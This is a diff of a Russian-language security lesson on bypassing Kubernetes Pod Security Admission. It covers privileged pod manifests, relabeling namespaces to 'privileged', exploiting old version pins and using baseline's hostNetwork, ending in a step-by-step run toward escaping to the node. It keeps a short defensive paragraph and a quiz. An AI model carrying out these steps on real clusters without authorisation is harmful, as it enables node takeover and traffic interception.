@@ -15,59 +15,59 @@ estimated_minutes: 45
 summary: "Pod Security Admission: уровни privileged/baseline/restricted, режимы enforce/audit/warn, labels namespace и version-pinned. Как читать политику и находить обходы."
 ---
 
-## Зачем этот урок
+## Задача
 
-Pod Security Admission (PSA) — встроенный admission-контроллер Kubernetes, пришедший на смену PodSecurityPolicy. Он применяет стандарты Pod Security Standards (PSS) к namespace по меткам. Для атакующего PSA — это «стена», которая может запретить привилегированные поды, hostPath, hostPID и опасные capabilities. Понимание PSA критично: часто обход находится не в самой политике, а в конфигурации namespace, версии или в другом namespace без метки.
+В кластере Kubernetes включён **Pod Security Admission (PSA)** — встроенный контроллер, который запрещает опасные поды. Ты хочешь запустить привилегированный под, чтобы выйти на узел, но получаешь ошибку `violates PodSecurity`. Как это обойти? Задача урока — понять модель PSA и найти слабое место — чаще всего не в самой политике, а в конфигурации namespace.
 
-## Модель PSA
+## Что такое PSA
 
-- **Уровни**: `privileged` (без ограничений), `baseline` (запрещает опасные поля), `restricted` (baseline + жёсткие требования по securityContext).
-- **Режимы**: `enforce` (отклоняет), `audit` (пишет в audit log), `warn` (предупреждение пользователю).
-- **Labels namespace**: `pod-security.kubernetes.io/enforce`, `.../audit`, `.../warn`, и `.../<mode>-version` (например, `enforce-version: v1.29`).
-- **Default**: кластер может задавать default-уровень через `--admission-control-config-file`.
-- **Version pinning**: поведение зависит от версии стандарта — можно использовать более старую версию с известными послаблениями.
+**PSA** пришёл на смену PodSecurityPolicy и применяет **Pod Security Standards (PSS)** к namespace по меткам. Это «стена», которая может запретить привилегированные поды, `hostPath`, `hostPID` и опасные capabilities.
 
-Ключевое: PSA действует **на namespace**, а не на отдельный под. Если namespace без метки (или с `privileged`), ограничений нет.
+Уровни:
 
-## Инструменты и команды
+- `privileged` — без ограничений.
+- `baseline` — запрещает самые опасные поля, но разрешает, например, `hostNetwork`.
+- `restricted` — `baseline` плюс жёсткие требования к `securityContext`.
+
+Режимы:
+
+- `enforce` — **отклоняет** нарушающие поды.
+- `audit` — пишет в audit log.
+- `warn` — предупреждение пользователю.
+
+Уровень задаётся метками на namespace: `pod-security.kubernetes.io/enforce`, `.../audit`, `.../warn`, и версией `.../enforce-version`. Ключевое: **PSA действует на namespace, а не на отдельный под.** Если namespace без метки (или с `privileged`), ограничений нет.
+
+## Данные, с которыми работаем
+
+Инвентаризация меток:
 
 ```bash
-# Метки PSA на namespace
-kubectl get ns --show-labels | grep pod-security
-kubectl get ns prod -o jsonpath='{.metadata.labels}'
-
-# Что именно enforce
-kubectl get ns prod -o jsonpath='{.metadata.labels.pod-security\.kubernetes\.io/enforce}'
-# restricted
-
-# Проверить, отклоняется ли под (dry-run)
-kubectl apply --dry-run=server -f privileged-pod.yaml
-# Error from server (Forbidden): pods "evil" is forbidden: violates PodSecurity "restricted:latest"
-
-# Аудит-события PSA
-kubectl get events -A --field-selector reason=FailedCreate | grep -i podsecurity
-
-# Какие namespace без меток (потенциально privileged)
-kubectl get ns -o json | jq -r '.items[] | select(.metadata.labels["pod-security.kubernetes.io/enforce"] == null) | .metadata.name'
+$ kubectl get ns --show-labels | grep pod-security
+prod   ...   pod-security.kubernetes.io/enforce=restricted
 ```
 
-## Разобранный пример: поиск namespace без PSA
-
-Сценарий: кластер использует PSA, но не все namespace помечены.
+`prod` защищён уровнем `restricted`. Но важно проверить все namespace, а не только очевидные:
 
 ```bash
-# 1. Ищем namespace без enforce-метки
-kubectl get ns -o json | jq -r '.items[] | select(.metadata.labels["pod-security.kubernetes.io/enforce"] == null) | .metadata.name'
-# kube-system
-# monitoring
-# legacy-apps
+$ kubectl get ns -o json | jq -r '.items[] | select(.metadata.labels["pod-security.kubernetes.io/enforce"] == null) | .metadata.name'
+kube-system
+monitoring
+legacy-apps
+```
 
-# 2. Проверяем, можем ли мы создавать поды в legacy-apps
-kubectl auth can-i create pods -n legacy-apps
-# yes
+Три namespace **без метки** — значит, ограничений там нет.
 
-# 3. Запускаем привилегированный под там
-cat <<'EOF' | kubectl apply -n legacy-apps -f -
+## Шаг 1: проверяем права и запускаем привилегированный под
+
+```bash
+$ kubectl auth can-i create pods -n legacy-apps
+yes
+```
+
+Есть право. Пробуем то, что запрещено в `prod`:
+
+```bash
+$ cat <<'EOF' | kubectl apply -n legacy-apps -f -
 apiVersion: v1
 kind: Pod
 metadata: { name: escape }
@@ -80,96 +80,93 @@ spec:
     securityContext: { privileged: true }
     command: ["sleep","infinity"]
 EOF
-# pod/escape created
+pod/escape created
 ```
 
-Namespace `legacy-apps` без метки PSA = нет ограничений. Даже если в `prod` стоит `restricted`, отсутствие метки в другом namespace открывает путь к привилегированному поду, а оттуда — к побегу на узел.
+Под создан. Теперь из него видно процессы узла (`hostPID`) и его сеть (`hostNetwork`) — путь к побегу.
 
-## Обходы и нюансы
+## Шаг 2: если namespace защищён — ищем другие рычаги
 
-- **Namespace без метки.** Самый простой обход: создать/использовать namespace, где PSA не настроен (default часто `privileged`, если не задан иначе).
-- **Смена метки.** Если у вас есть право `update` на namespace, снимите/ослабьте метку. Проверьте `kubectl auth can-i update ns/prod`.
-- **Version pinning.** `enforce-version: v1.24` может разрешать то, что запрещено в `v1.29`. Проверяйте версию.
-- **Объекты, не подпадающие под PSA.** PSA применяется к Pod и контроллерам (Deployment/Job и т.п.), но не к, например, статическим подам kubelet или к некоторым CRD, создающим поды напрямую.
-- **Привилегированные контроллеры.** Если контроллер (DaemonSet, operator) уже привилегированный, используйте его как «лазейку» — измените его spec.
-- **Baseline vs restricted.** `baseline` разрешает, например, `hostNetwork`, `hostPort`, некоторые capabilities. Проверьте, какой уровень стоит.
+Проверяем, нет ли права менять саму метку:
 
-## Чек-лист атаки
+```bash
+$ kubectl auth can-i update ns/prod
+yes
+$ kubectl label ns prod pod-security.kubernetes.io/enforce=privileged --overwrite
+namespace/prod labeled
+```
 
-1. Инвентаризация меток PSA по namespace.
-2. Найти namespace без метки или с `privileged`.
-3. Проверить права на создание подов и на изменение namespace.
-4. Проверить версию стандарта (version pinning).
-5. Проверить существующие привилегированные контроллеры.
-6. Проверить, какие поля разрешает текущий уровень (baseline).
-7. Проверить default-уровень кластера.
+Ослабили политику — теперь под проходит. Это недооценённое право: `update` на namespace сводит PSA на нет.
 
-## Обход защит и edge cases
+## Шаг 3: version pinning и baseline
 
-- **Restricted требует**: `runAsNonRoot`, `seccompProfile: RuntimeDefault`, drop ALL capabilities, запрет `privileged`, `hostPath`, `hostPID/Network/IPC`. Обход — искать namespace без restricted.
-- **Право update namespace.** Часто недооценивается; проверяйте.
-- **Aggregated API / CRD.** Некоторые CRD создают поды в обход PSA.
-- **Ephemeral containers.** `kubectl debug` добавляет ephemeral-контейнеры; PSA проверяет их, но некоторые старые версии — нет.
-- **Init-контейнеры.** Проверяются, но конфигурация может отличаться.
-- **kube-system.** Часто privileged; если есть доступ — прямая лазейка.
+Версия стандарта влияет на запреты: `enforce-version: v1.24` может разрешать то, что запрещено в `v1.29`.
 
-## Частые ошибки и подводные камни
+```bash
+$ kubectl get ns prod -o jsonpath='{.metadata.labels.pod-security\.kubernetes\.io/enforce-version}'
+v1.24
+```
 
-- Считать, что «restricted стоит везде»: проверяйте каждый namespace.
-- Не проверить права на изменение namespace-метки.
-- Игнорировать version pinning.
-- Забыть про CRD/агрегированные API.
-- Путать режимы enforce/audit/warn.
+А уровень `baseline` разрешает `hostNetwork`/`hostPort` — уже доступ к сети хоста и перехват трафика. Проверяй и уровень, и версию: часто хотя бы один namespace окажется на `baseline` или без метки.
 
-## Защита и детект
+## Полный прогон от начала до конца
 
-- Пометить ВСЕ namespace (включая kube-system) уровнем не ниже baseline; prod — restricted.
-- Запретить изменение меток namespace для непривилегированных ролей.
-- Использовать актуальную версию стандарта (без pinning на старую).
-- Аудит: PSA-события, `kubectl get events`; алертить на создание привилегированных подов.
-- Дополнительно — Kyverno/OPA для политик, которые PSA не покрывает.
+1. `kubectl get ns --show-labels` → у `prod` `restricted`.
+2. Ищем namespace без метки → `legacy-apps`.
+3. `auth can-i create pods -n legacy-apps` → yes.
+4. Применяем привилегированный под → создан.
+5. Из пода — `hostPID`/`hostNetwork` → побег на узел.
+
+## Если не сработало
+
+- **Все namespace помечены.** Тогда проверь права `update` на namespace, версию стандарта и default-уровень кластера.
+- **CRD/агрегированные API.** Некоторые CRD создают поды в обход PSA — проверь установленные операторы.
+- **Ephemeral containers.** `kubectl debug` добавляет эфемерные контейнеры; старые версии PSA их не проверяют.
+- **Привилегированный контроллер.** Если DaemonSet/оператор уже привилегированный — измени его spec и переиспользуй.
+- **kube-system.** Часто `privileged`; при доступе — прямая лазейка.
+- **Static pods.** Kubelet создаёт их в обход admission.
+
+## Version pinning и baseline подробнее
+
+Версия стандарта влияет на то, что разрешено: `enforce-version: v1.24` может разрешать поля, запрещённые в `v1.29`. Смотрим версию и проверяем, что разрешает текущий уровень:
+
+```bash
+$ kubectl get ns prod -o jsonpath='{.metadata.labels.pod-security\.kubernetes\.io/enforce-version}'
+v1.24
+$ kubectl label ns test pod-security.kubernetes.io/enforce=baseline --overwrite
+namespace/test labeled
+$ kubectl apply -n test -f hostnet-pod.yaml   # под с hostNetwork: true
+pod/hostnet created
+```
+
+`baseline` допускает `hostNetwork`/`hostPort` — это уже доступ к сети хоста и потенциальный перехват трафика. Для атакующего вывод: проверяй и уровень, и версию, и default-уровень кластера; часто хотя бы один namespace окажется на `baseline` или без метки.
 
 ## Модель угроз и типовые мисконфиги
 
-Типичный мисконфиг — namespace без метки. Второй — `privileged` в kube-system с доступом. Третий — права update на namespace. Четвёртый — version pinning на старую версию. Пятый — CRD, создающий поды. Все они позволяют обойти PSA.
+Типичный мисконфиг — namespace без метки. Второй — `privileged` в kube-system, куда есть доступ. Третий — право `update` на namespace у непривилегированной роли. Четвёртый — version pinning на старую версию. Пятый — CRD или оператор, создающий поды в обход PSA. Каждый из них позволяет получить привилегированный под, а оттуда — побег на узел. Для защитника вывод: помечай **все** namespace (включая kube-system) уровнем не ниже `baseline`, а `prod` — `restricted`, и запрети менять метки непривилегированным ролям. Дополнительно используй Kyverno/OPA для политик, которые PSA не покрывает (например, запрет конкретных образов или registry).
 
-## Практическое задание
+## Объекты, обходящие PSA
 
-1. Помечайте namespace `restricted` и попробуйте создать привилегированный под — получите ошибку.
-2. Создайте namespace без метки и создайте тот же под — успех.
-3. Выдайте роль с правом update namespace и снимите метку.
-4. Настройте default-уровень кластера и проверьте.
+PSA применяется к Pod и контроллерам (Deployment, Job, StatefulSet), но не покрывает всё. **Статические поды** kubelet создаёт в обход admission. **Агрегированные API и CRD** некоторых операторов создают поды напрямую. **Ephemeral-контейнеры** (`kubectl debug`) добавляются к существующему поду, и старые версии PSA их не проверяют. **Init-контейнеры** проверяются, но их конфигурация может отличаться. Проверяя кластер, посмотри, какие операторы и CRD установлены, — среди них часто находится обход.
 
-## Что дальше / решение
+## Что мы теперь знаем
 
-Обход PSA открывает путь к привилегированному поду и побегу. Дальше — nsenter/hostPath (см. урок про runc). Зафиксируйте путь «namespace без метки → привилегированный под → узел» в графе. Если все namespace помечены строго — ищите CRD/контроллеры или CVE.
+- PSA действует на namespace по меткам, а не на отдельный под.
+- Режимы: `enforce` блокирует, `audit`/`warn` — нет.
+- Namespace без метки = нет ограничений — самый простой обход.
+- Право `update` на namespace позволяет снять/ослабить политику.
+- Version pinning на старую версию оставляет известные послабления.
+- CRD, статические поды и эфемерные контейнеры могут обходить PSA.
 
-## Разобранный пример 2: version pinning и baseline
+## На что смотреть дальше
 
-Версия стандарта влияет на то, что разрешено. `enforce-version: v1.24` может разрешать поля, запрещённые в `v1.29`. А уровень `baseline` (в отличие от `restricted`) разрешает, например, `hostNetwork`, `hostPort` и некоторые capabilities.
-
-```bash
-# Смотрим версию стандарта
-kubectl get ns prod -o jsonpath='{.metadata.labels.pod-security\.kubernetes\.io/enforce-version}'
-# v1.24
-
-# Проверяем, какие поля разрешает baseline
-kubectl label ns test pod-security.kubernetes.io/enforce=baseline --overwrite
-# Затем пробуем под с hostNetwork: true -> допускается baseline
-cat <<'EOF' | kubectl apply -n test -f -
-apiVersion: v1
-kind: Pod
-metadata: { name: hostnet }
-spec:
-  hostNetwork: true
-  containers: [{ name: c, image: alpine, command: ["sleep","infinity"] }]
-EOF
-# pod/hostnet created
-```
-
-`baseline` допускает `hostNetwork`/`hostPort`, что уже даёт доступ к сети хоста и потенциальный перехват трафика. Плюс version pinning на старую версию оставляет известные послабления. Для атакующего: проверьте и уровень, и версию, и наличие default-уровня; часто хотя бы один namespace окажется на `baseline` или без метки.
+- **cloud-runc-escape-deep**: что делать с привилегированным подом дальше.
+- **cloud-k8s-falco-bypass**: runtime-детект, который сработает на побеге.
+- **cloud-kubernetes-rbac**: как получить право `update` на namespace.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "На каком уровне действует Pod Security Admission?"
@@ -204,7 +201,19 @@ EOF
     - "Только образы"
   answer: 0
   explanation: "restricted — самый строгий уровень PSS."
+- question: "Почему право update на namespace опасно?"
+  options:
+    - "Позволяет ослабить или снять метку PSA"
+    - "Даёт root на узле"
+    - "Читает секреты"
+    - "Меняет биллинг"
+  answer: 0
+  explanation: "Изменив метку enforce, можно разрешить привилегированные поды."
 ```
+
+## Куда дальше
+
+В следующем уроке мы разберём **побег из контейнера через runc** — конкретные CVE и `nsenter`. А пока главное запомни: **PSA защищает namespace, поэтому ищи namespace без метки или право ослабить её — обход почти всегда в конфигурации, а не в политике.**
 
 ## Где пригодится
 
